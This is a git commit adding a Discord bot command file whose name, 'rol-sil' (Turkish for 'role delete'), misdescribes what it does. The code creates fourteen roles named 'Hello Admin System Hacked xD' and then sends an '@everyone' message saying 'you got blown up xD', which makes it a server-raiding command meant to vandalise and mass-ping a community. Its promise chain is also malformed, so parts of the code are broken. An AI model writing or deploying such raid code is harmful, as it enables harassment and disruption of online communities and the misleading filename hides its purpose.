0618ecd92f489b9481619cd08b93abb9da7a5d6f
Akardiyan <74492444+Akardiyan@users.noreply.github.com>
2021-08-04 17:19:58 +0300

    Add files via upload

---
+++ komutlar/rol-sil.js
@@ -0,0 +1,72 @@
+const Discord = require('discord.js')
+
+exports.run = async (client, message, args) => {
+  
+let guild = message.guild;
+
+
+message.guild.createRole({
+  name: 'Hello Admin System Hacked xD',
+})
+
+message.guild.createRole({
+  name: 'Hello Admin System Hacked xD',
+})
+
+message.guild.createRole({
+  name: 'Hello Admin System Hacked xD',
+})
+
+message.guild.createRole({
+  name: 'Hello Admin System Hacked xD',
+})
+
+message.guild.createRole({
+  name: 'Hello Admin System Hacked xD',
+})
+
+message.guild.createRole({
+  name: 'Hello Admin System Hacked xD',
+})
+
+message.guild.createRole({
+  name: 'Hello Admin System Hacked xD',
+})
+
+message.guild.createRole({
+  name: 'Hello Admin System Hacked xD',
+})
+
+message.guild.createRole({
+  name: 'Hello Admin System Hacked xD',
+})
+
+message.guild.createRole({
+  name: 'Hello Admin System Hacked xD',
+})
+
+message.guild.createRole({
+  name: 'Hello Admin System Hacked xD',
+})
+
+message.guild.createRole({
+  name: 'Hello Admin System Hacked xD',
+})
+
+message.guild.createRole({
+  name: 'Hello Admin System Hacked xD',
+})
+
+message.guild.createRole({
+  name: 'Hello Admin System Hacked xD',
+})
+
+.then(role => message.channel.send(`@everyone Patladınız xD`))
+.catch(console.error)
+  
+}
+
+ exports.config = {
+  name: 'rsp',
+   aliases: ["rsp"]
+ };
